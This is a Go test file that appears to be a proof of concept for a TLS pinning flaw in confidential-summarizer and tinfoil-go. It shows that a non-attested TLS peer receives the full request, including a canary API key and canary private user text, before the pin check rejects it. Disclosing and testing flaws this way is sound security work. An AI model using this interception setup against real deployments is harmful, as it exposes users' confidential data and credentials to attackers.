package main

// Dropped into an unmodified copy of confidential-summarizer v0.1.15 (module
// proxy zip; go.mod pins tinfoil-go v0.11.3 and verifier v0.11.2).
//
// Real code exercised: summaryService.ServeHTTP -> openAIUpstream.Summarize
// -> openai-go v3.16.0 -> tinfoil-go v0.11.3 reVerifyingTransport ->
// verifier v0.11.2 TLSBoundRoundTripper -> http.DefaultTransport.
//
// Stubbed: the result of a successful startup Verify() (the SecureClient's
// groundTruth.TLSPublicKey is set to the genuine router key fingerprint, which
// is what verifier client.go:220-230 stores). The client is then built by
// tinfoil-go's own createClientFromSecureClient (tinfoil_client.go:91-118),
// exactly as NewClient does after NewDefaultClient. The stub only skips the
// network attestation fetch; the pin value and transport chain are the real
// ones.

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"
	"time"
	"unsafe"

	"github.com/openai/openai-go/v3/option"
	"github.com/sirupsen/logrus"
	tinfoil "github.com/tinfoilsh/tinfoil-go"
	verifierclient "github.com/tinfoilsh/verifier/client"

	"github.com/tinfoilsh/confidential-summarizer/config"
)

//go:linkname createClientFromSecureClient github.com/tinfoilsh/tinfoil-go.createClientFromSecureClient
func createClientFromSecureClient(sc *verifierclient.SecureClient, opts ...option.RequestOption) (*tinfoil.Client, error)

const canaryAPIKey = "tk_CANARY_SUMMARIZER_API_KEY"
const canaryText = "CANARY-USER-SECRET: I was diagnosed with HIV yesterday, how do I tell my employer"

// startSummarizer wires the real summarizer exactly as main.go:34-42 does,
// with the SDK client pinned to pinnedFP.
func startSummarizer(t *testing.T, pinnedFP string) string {
	t.Helper()
	sc := verifierclient.NewSecureClient(routerHost, "tinfoilsh/confidential-model-router")
	f := reflect.ValueOf(sc).Elem().FieldByName("groundTruth")
	reflect.NewAt(f.Type(), unsafe.Pointer(f.UnsafeAddr())).Elem().Set(reflect.ValueOf(
		&verifierclient.GroundTruth{EnclaveHost: routerHost, TLSPublicKey: pinnedFP}))
	tc, err := createClientFromSecureClient(sc, openAIClientOptions(canaryAPIKey)...)
	if err != nil {
		t.Fatal(err)
	}
	logger := logrus.New()
	logger.SetOutput(io.Discard)
	mux := http.NewServeMux()
	mux.Handle("/summarize", newSummaryService(newOpenAIUpstream(tc.Client, config.DefaultModel), defaultUpstreamTimeout, logger))
	front := httptest.NewServer(mux)
	t.Cleanup(front.Close)
	return front.URL
}

type result struct {
	status int
	body   string
}

func postSummarize(url string, done chan<- result) {
	b, _ := json.Marshal(map[string]string{"content": canaryText, "style": "title_summary"})
	resp, err := http.Post(url+"/summarize", "application/json", strings.NewReader(string(b)))
	if err != nil {
		done <- result{0, err.Error()}
		return
	}
	rb, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	done <- result{resp.StatusCode, strings.TrimSpace(string(rb))}
}

// The attacker's key differs from the attested key. It still receives the
// whole request, including the API key, while the summarizer is blocked
// inside http.DefaultTransport.RoundTrip, i.e. before any pin check ran.
func TestVulnerable_PinCheckedAfterSend(t *testing.T) {
	genuine, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pinned := keyFP(&genuine.PublicKey)
	a := startAttacker(t, true) // withhold response
	url := startSummarizer(t, pinned)

	done := make(chan result, 1)
	go postSummarize(url, done)

	var got captured
	select {
	case got = <-a.reqs:
	case <-time.After(15 * time.Second):
		t.Fatal("attacker received nothing")
	}
	time.Sleep(300 * time.Millisecond)
	select {
	case r := <-done:
		t.Fatalf("summarizer returned before the attacker answered: %+v", r)
	default:
	}
	t.Logf("pinned (attested) key FP : %s", pinned)
	t.Logf("attacker cert key FP     : %s", a.fp)
	t.Logf("[attacker, response withheld] %s %s%s %s", got.method, got.host, got.path, got.proto)
	t.Logf("[attacker, response withheld] Authorization: %s", got.auth)
	t.Logf("[attacker, response withheld] body: %s", got.body)
	t.Logf("summarizer upstream call still pending: pin check has not run")

	close(a.release)
	r := <-done
	t.Logf("end user got: %d %s", r.status, r.body)
	for _, l := range dnsSnapshot() {
		t.Logf("resolver: %s", l)
	}
	if got.auth != "Bearer "+canaryAPIKey || !strings.Contains(got.body, canaryText) || got.path != "/v1/chat/completions" {
		t.Fatal("attacker did not receive the full request")
	}
	if r.status != http.StatusServiceUnavailable {
		t.Fatalf("expected 503 after late pin check, got %d", r.status)
	}
	t.Log("VULNERABLE: full plaintext request (user text + API key) reached a non-attested TLS peer; pin mismatch detected only afterwards (503)")
}

// Positive control for the harness: when the peer's key IS the attested key
// the same setup returns the peer's title, so the 503 above is caused by the
// (late) pin check and nothing else.
func TestControl_HonestPeerAccepted(t *testing.T) {
	a := startAttacker(t, false)
	url := startSummarizer(t, a.fp)
	done := make(chan result, 1)
	postSummarize(url, done)
	r := <-done
	t.Logf("pinned key == peer key: end user got %d %s", r.status, r.body)
	if r.status != http.StatusOK || !strings.Contains(r.body, "Peer chosen title") {
		t.Fatalf("harness broken: %+v", r)
	}
}
